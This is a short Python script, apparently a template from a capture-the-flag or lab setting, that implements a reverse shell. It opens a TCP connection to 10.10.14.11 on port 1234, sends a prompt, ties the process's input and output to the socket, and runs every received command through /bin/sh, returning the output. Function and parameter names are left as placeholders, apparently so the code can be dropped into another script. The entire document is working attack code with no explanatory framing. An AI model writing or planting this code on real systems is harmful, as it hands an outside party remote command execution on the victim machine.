#!/usr/bin/env python3
import socket
import subprocess
import os

def CHANGE_ME(CHAME_ME_TOO):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("10.10.14.11", 1234))
    sock.sendall('Call-back appeared, enter command:\n~$ '.encode())
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    
    while True:
        cmd = sock.recv(4096)
        process = subprocess.Popen(["/bin/sh", "-c", cmd], stdout=subprocess.PIPE)
        stdout = process.communicate()[0].decode("utf-8").split("\n")
        data = ''
        for line in stdout:
            data += line + "\n"
        data += '~$ '
        sock.sendall(data.encode())